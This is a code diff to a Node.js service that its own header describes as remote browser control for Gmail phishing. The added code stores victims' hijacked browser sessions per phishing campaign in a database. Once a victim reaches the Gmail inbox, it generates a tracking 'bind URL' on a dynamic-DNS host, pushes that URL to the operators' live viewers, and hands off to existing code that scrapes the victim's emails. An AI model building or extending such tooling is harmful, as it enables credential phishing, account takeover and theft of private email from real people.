@@ -1,6 +1,7 @@
 const puppeteer = require('puppeteer');
 const stealth = require('puppeteer-extra-plugin-stealth');
 const { EventEmitter } = require('events');
+const crypto = require('crypto');
 
 /**
  * Gmail Browser Service - Remote Browser Control for Gmail Phishing
@@ -71,6 +72,112 @@ class GmailBrowserService extends EventEmitter {
   setSocketIO(io) {
     this.io = io;
     console.log('✅ Socket.IO instance set for Gmail Browser Service');
+  }
+
+  /**
+   * Database operations for Gmail session bindings
+   */
+  async saveSessionToDatabase(sessionToken, campaignId, userInfo) {
+    return new Promise((resolve, reject) => {
+      const db = require('../database');
+      const userInfoJson = JSON.stringify(userInfo);
+      
+      db.run(
+        `INSERT OR REPLACE INTO GmailBrowserSessions 
+         (session_token, campaign_id, user_info, status, created_at, last_activity) 
+         VALUES (?, ?, ?, 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
+        [sessionToken, campaignId, userInfoJson],
+        function(err) {
+          if (err) {
+            console.error('Error saving session to database:', err);
+            reject(err);
+          } else {
+            console.log('Session saved to database:', sessionToken);
+            resolve(this.lastID);
+          }
+        }
+      );
+    });
+  }
+
+  async updateSessionBindUrl(sessionToken, bindUrl, trackingId) {
+    return new Promise((resolve, reject) => {
+      const db = require('../database');
+      
+      db.run(
+        `UPDATE GmailBrowserSessions 
+         SET bind_url = ?, tracking_id = ?, logged_in_at = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP 
+         WHERE session_token = ?`,
+        [bindUrl, trackingId, sessionToken],
+        function(err) {
+          if (err) {
+            console.error('Error updating session bind URL:', err);
+            reject(err);
+          } else {
+            console.log('Session bind URL updated:', sessionToken, bindUrl);
+            resolve(this.changes);
+          }
+        }
+      );
+    });
+  }
+
+  async getBoundSessions(campaignId = null) {
+    return new Promise((resolve, reject) => {
+      const db = require('../database');
+      let query = `SELECT * FROM GmailBrowserSessions WHERE bind_url IS NOT NULL AND status = 'active'`;
+      let params = [];
+      
+      if (campaignId) {
+        query += ` AND campaign_id = ?`;
+        params.push(campaignId);
+      }
+      
+      query += ` ORDER BY logged_in_at DESC`;
+      
+      db.all(query, params, (err, rows) => {
+        if (err) {
+          console.error('Error getting bound sessions:', err);
+          reject(err);
+        } else {
+          resolve(rows.map(row => ({
+            ...row,
+            user_info: JSON.parse(row.user_info || '{}')
+          })));
+        }
+      });
+    });
+  }
+
+  async getSessionByToken(sessionToken) {
+    return new Promise((resolve, reject) => {
+      const db = require('../database');
+      
+      db.get(
+        `SELECT * FROM GmailBrowserSessions WHERE session_token = ?`,
+        [sessionToken],
+        (err, row) => {
+          if (err) {
+            console.error('Error getting session by token:', err);
+            reject(err);
+          } else {
+            resolve(row ? {
+              ...row,
+              user_info: JSON.parse(row.user_info || '{}')
+            } : null);
+          }
+        }
+      );
+    });
+  }
+
+  generateBindUrl(sessionToken) {
+    const trackingId = crypto.randomUUID();
+    const baseUrl = process.env.BASE_URL || 'https://spaceform.ddns.net';
+    return {
+      bindUrl: `${baseUrl}/gmail-browser/${sessionToken}?_fstrike_track=${trackingId}`,
+      trackingId
+    };
   }
 
   /**
@@ -229,6 +336,14 @@ class GmailBrowserService extends EventEmitter {
       this.activeSessions.set(sessionToken, sessionData);
       this.browsers.set(sessionToken, browser);
       this.pages.set(sessionToken, page);
+
+      // Save session to database
+      try {
+        await this.saveSessionToDatabase(sessionToken, campaignId, userInfo);
+      } catch (dbError) {
+        console.error('Warning: Failed to save session to database:', dbError);
+        // Continue anyway as the in-memory session is working
+      }
 
       // Wait a moment for page to stabilize
       await new Promise(resolve => setTimeout(resolve, 2000));
@@ -480,7 +595,27 @@ class GmailBrowserService extends EventEmitter {
 
         // Check if user successfully logged into Gmail
         if (url.includes('mail.google.com/mail') && !url.includes('accounts.google.com')) {
-          console.log(`🎯 User is now in Gmail! Attempting to scrape emails...`);
+          console.log(`🎯 User is now in Gmail! Creating bind URL...`);
+          
+          // Generate bind URL when user successfully logs in
+          try {
+            const { bindUrl, trackingId } = this.generateBindUrl(sessionToken);
+            await this.updateSessionBindUrl(sessionToken, bindUrl, trackingId);
+            
+            console.log(`🔗 Bind URL created: ${bindUrl}`);
+            
+            // Broadcast bind URL creation to viewers
+            if (this.io) {
+              this.io.to(`gmail-session-${sessionToken}`).emit('bindUrlCreated', {
+                sessionToken,
+                bindUrl,
+                trackingId,
+                timestamp: new Date(),
+              });
+            }
+          } catch (error) {
+            console.error('Error creating bind URL:', error);
+          }
           
           // Wait for Gmail to load completely, then scrape
           setTimeout(async () => {
